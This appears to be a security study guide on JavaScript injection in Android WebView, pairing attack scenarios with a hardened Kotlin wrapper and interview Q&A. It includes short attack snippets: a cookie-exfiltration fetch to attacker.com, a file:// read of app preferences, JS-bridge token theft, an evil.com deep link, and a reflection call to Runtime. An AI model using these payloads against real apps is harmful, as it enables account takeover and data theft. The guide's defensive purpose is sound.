# Injecting js in web view

Injecting JavaScript into an Android `WebView` is a **high-risk area** from a security standpoint. Since you're preparing from a security-engineering perspective, here’s a structured breakdown focusing on *how it works, why it’s dangerous, and real exploitation scenarios*.

---

# 🔹 1. What is JavaScript Injection in WebView?

- It refers to executing arbitrary JavaScript inside a `WebView`
- Done via:
    - `webView.loadUrl("javascript:...")`
    - `webView.evaluateJavascript(...)`
- Often used for:
    - DOM manipulation
    - Bridging native ↔ web communication

---

# 🔹 2. How It Works (Internals)

### Flow:

1. App loads a webpage in `WebView`
2. JavaScript is enabled:
    
    ```kotlin
    webView.settings.javaScriptEnabled = true
    ```
    
3. App injects JS:
    
    ```kotlin
    webView.evaluateJavascript("alert('Hello')", null)
    ```
    
4. JS executes in the context of the loaded page

---

# 🔹 3. Why It’s Used

- Hybrid apps (Web + Native)
- Inject data into web pages dynamically
- Automate UI interaction
- Extract DOM data

---

# 🔹 4. Dangerous Configurations (Root Cause of Vulnerabilities)

### 🚨 Enabling JavaScript

```kotlin
webView.settings.javaScriptEnabled = true
```

### 🚨 Adding Java Bridge

```kotlin
webView.addJavascriptInterface(MyInterface(), "Android")
```

### 🚨 Loading Untrusted Content

```kotlin
webView.loadUrl("http://example.com")
```

---

# 🔹 5. Critical Vulnerabilities

## 1. JavaScript Interface Exploitation

- If `addJavascriptInterface` is exposed:

```kotlin
class MyInterface {
    @JavascriptInterface
    fun getToken(): String { return "secret_token" }
}
```

### Attack:

Injected JS:

```jsx
Android.getToken()
```

👉 Attacker can steal:

- Tokens
- User data
- Device info

---

## 2. XSS inside WebView

- If WebView loads attacker-controlled content:

```kotlin
webView.loadUrl(userInputUrl)
```

### Attack:

```html
<script>
    fetch("https://attacker.com?data=" + document.cookie)
</script>
```

---

## 3. Remote Code Execution (Old Android < 4.2)

- Reflection attack via JS interface
- Could execute arbitrary Java methods

---

## 4. Man-in-the-Middle (MITM)

- If HTTP is used instead of HTTPS:

```kotlin
webView.loadUrl("http://site.com")
```

👉 Attacker injects JS in transit

---

## 5. File Access Exploitation

```kotlin
webView.settings.allowFileAccess = true
```

👉 Attack:

```jsx
fetch("file:///data/data/com.app/shared_prefs/secret.xml")
```

---

# 🔹 6. Real-World Attack Scenario

### Scenario: Token Theft

1. App loads:
    
    ```kotlin
    webView.loadUrl("https://trusted-site.com")
    ```
    
2. MITM injects malicious JS
3. JS calls:
    
    ```jsx
    Android.getAuthToken()
    ```
    
4. Token exfiltrated

---

### Scenario: Deep Link + WebView

- App opens WebView via deep link:

```
myapp://open?url=http://malicious.com
```

👉 Loads attacker page → injects JS → steals data

---

# 🔹 7. Secure Implementation (Best Practices)

## ✅ Disable JavaScript if not needed

```kotlin
webView.settings.javaScriptEnabled = false
```

---

## ✅ Avoid `addJavascriptInterface`

- If required:
    - Use minimal exposure
    - Validate input strictly

---

## ✅ Restrict URL loading

```kotlin
override fun shouldOverrideUrlLoading(...): Boolean {
    return !url.startsWith("https://trusted.com")
}
```

---

## ✅ Enforce HTTPS

```xml
android:usesCleartextTraffic="false"
```

---

## ✅ Disable File Access

```kotlin
webView.settings.allowFileAccess = false
webView.settings.allowContentAccess = false
```

---

## ✅ Use Safe Browsing

```kotlin
WebView.enableSafeBrowsing(context)
```

---

## ✅ Remove JS Interfaces for untrusted content

```kotlin
webView.removeJavascriptInterface("Android")
```

---

# 🔹 8. Secure Alternative to JS Injection

- Use:
    - `postMessage` (WebMessage API)
    - Custom URL schemes
    - REST APIs instead of JS bridge

---

# 🔹 9. Interview Q&A (Important)

### Q: Why is `addJavascriptInterface` dangerous?

👉 It exposes native methods to JS → can be abused by injected scripts

---

### Q: Difference between `loadUrl("javascript:")` and `evaluateJavascript()`?

- `loadUrl` → slower, no return value
- `evaluateJavascript` → async, returns result

---

### Q: How to prevent WebView injection attacks?

- Disable JS
- Restrict URLs
- Avoid JS bridges
- Use HTTPS
- Validate inputs

---

### Q: What is WebView XSS?

👉 Executing malicious JS in WebView via untrusted content

---

# 🔹 10. Trap Questions

### ❗ “If my site is trusted, am I safe?”

👉 No — MITM or compromised server can inject JS

---

### ❗ “ProGuard/R8 protects WebView?”

👉 No — it only obfuscates code, not runtime behavior

---

### ❗ “HTTPS alone is enough?”

👉 No — still vulnerable to XSS and JS interface abuse

---

You’re asking the right things—this is exactly where real-world Android app compromises happen. I’ll split this into two parts: **actual bug bounty cases (with attack mechanics)** and then a **production-grade secure WebView wrapper architecture** you can directly apply.

---

# 🔴 PART 1: Real Bug Bounty Cases (WebView Exploitation)

## 1. Token Theft via `addJavascriptInterface` (Multiple Apps)

### 💥 Root Issue

- App exposed sensitive APIs:

```kotlin
webView.addJavascriptInterface(AppBridge(), "Android")
```

### 💥 Vulnerability

- WebView loaded user-controlled or interceptable content

### 💥 Exploit

```jsx
Android.getAccessToken()
```

### 💥 Impact

- Account takeover
- Session hijacking

### 🧠 Key Insight

> JS bridge = **remote API exposed to attacker**
> 

---

## 2. Deep Link → Arbitrary URL Load → JS Injection

### 💥 Root Issue

```kotlin
val url = intent.getStringExtra("url")
webView.loadUrl(url)
```

### 💥 Exploit Chain

1. Attacker crafts:

```
myapp://openWeb?url=https://evil.com
```

1. App loads attacker page
2. Page executes malicious JS
3. Calls exposed interfaces or steals cookies

### 💥 Impact

- Phishing inside app (looks trusted)
- Data exfiltration

---

## 3. MITM Injection on HTTP (Reported in fintech apps)

### 💥 Root Issue

```kotlin
webView.loadUrl("http://payment.com")
```

### 💥 Exploit

- Attacker injects:

```jsx
document.body.innerHTML = "Fake Payment Page"
```

### 💥 Impact

- Payment fraud
- Credential harvesting

### 🧠 Insight

> Even “trusted domains” are unsafe over HTTP
> 

---

## 4. Local File Theft via Misconfiguration

### 💥 Root Issue

```kotlin
webView.settings.allowFileAccess = true
webView.settings.allowUniversalAccessFromFileURLs = true
```

### 💥 Exploit

```jsx
fetch("file:///data/data/com.app/shared_prefs/user.xml")
```

### 💥 Impact

- Token leakage
- Sensitive config exposure

---

## 5. Old Android RCE (Pre-API 17)

### 💥 Root Issue

- `addJavascriptInterface` allowed reflection

### 💥 Exploit

```jsx
Android.getClass().forName("java.lang.Runtime")
```

### 💥 Impact

- Full Remote Code Execution

---

## 6. OAuth Token Leakage via WebView

### 💥 Root Issue

- OAuth flow inside WebView

### 💥 Exploit

```jsx
window.location.href
```

- Extract token from redirect URL

### 💥 Impact

- Account takeover

### 🧠 Insight

> Never do OAuth in WebView → use Chrome Custom Tabs
> 

---

# 🟢 PART 2: Secure WebView Wrapper Architecture (Production Grade)

Think of this as a **defensive abstraction layer** over raw `WebView`.

---

# 🧱 1. Architecture Overview

```
UI Layer
   ↓
SecureWebViewWrapper
   ↓
Security Controller (Validation, Filtering)
   ↓
Hardened WebView Instance
```

---

# 🧩 2. Secure WebView Wrapper (Kotlin)

## 🔐 Core Wrapper

```kotlin
class SecureWebView(context: Context) : WebView(context) {

    init {
        setupSecurity()
    }

    private fun setupSecurity() {
        settings.apply {
            javaScriptEnabled = false // enable only if required
            domStorageEnabled = false
            allowFileAccess = false
            allowContentAccess = false
            allowUniversalAccessFromFileURLs = false
            mixedContentMode = WebSettings.MIXED_CONTENT_NEVER_ALLOW
        }

        WebView.setWebContentsDebuggingEnabled(false)

        removeJavascriptInterface("Android")
        removeJavascriptInterface("JSInterface")

        webViewClient = SecureWebViewClient()
    }
}
```

---

# 🛡️ 3. URL Whitelisting (CRITICAL)

```kotlin
class SecureWebViewClient : WebViewClient() {

    private val allowedHosts = setOf("trusted.com", "api.trusted.com")

    override fun shouldOverrideUrlLoading(
        view: WebView,
        request: WebResourceRequest
    ): Boolean {

        val uri = request.url

        return if (uri.host in allowedHosts && uri.scheme == "https") {
            false
        } else {
            true // block
        }
    }
}
```

---

# 🔒 4. Controlled JavaScript Injection

Instead of raw injection:

```kotlin
webView.evaluateJavascript("someDynamicJS", null)
```

### ✅ Use Sanitized + Static JS

```kotlin
fun injectSafeScript(webView: WebView, data: String) {
    val safeData = JSONObject.quote(data)

    val script = """
        (function() {
            const data = $safeData;
            window.processData(data);
        })();
    """.trimIndent()

    webView.evaluateJavascript(script, null)
}
```

---

# 🚫 5. Secure Deep Link Handling

```kotlin
fun handleDeepLink(uri: Uri) {
    val url = uri.getQueryParameter("url") ?: return

    val parsed = Uri.parse(url)

    if (parsed.host == "trusted.com" && parsed.scheme == "https") {
        webView.loadUrl(url)
    } else {
        throw SecurityException("Untrusted URL")
    }
}
```

---

# 🔐 6. Disable Dangerous Features

```kotlin
settings.savePassword = false
settings.setSupportMultipleWindows(false)
settings.javaScriptCanOpenWindowsAutomatically = false
```

---

# 🔍 7. Network Security Config

```xml
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system"/>
        </trust-anchors>
    </base-config>
</network-security-config>
```

---

# 🧠 8. Advanced Hardening (Production-Level)

### ✅ Certificate Pinning

- Prevent MITM even on HTTPS

---

### ✅ Content Security Policy (Server-side)

```
Content-Security-Policy: default-src 'self';
```

---

### ✅ Use Chrome Custom Tabs for:

- Payments
- OAuth
- External content

---

### ✅ Runtime Monitoring

- Detect:
    - Unexpected redirects
    - JS execution anomalies

---

# ⚠️ 9. Common Mistakes (Seen in Real Apps)

- ❌ Trusting user input URLs
- ❌ Enabling JS globally
- ❌ Using WebView for login/payment
- ❌ Leaving debug enabled in production
- ❌ Not removing default JS interfaces

---

# 🎯 10. Interview-Level Insight

### Q: “Design a secure WebView system”

👉 Expected answer:

- Wrapper class
- URL whitelisting
- JS disabled by default
- No JS interface exposure
- HTTPS enforcement
- Deep link validation
- Use Custom Tabs for sensitive flows

---

### Q: “Biggest WebView risk?”

👉 `addJavascriptInterface` + untrusted content = RCE/data theft

---
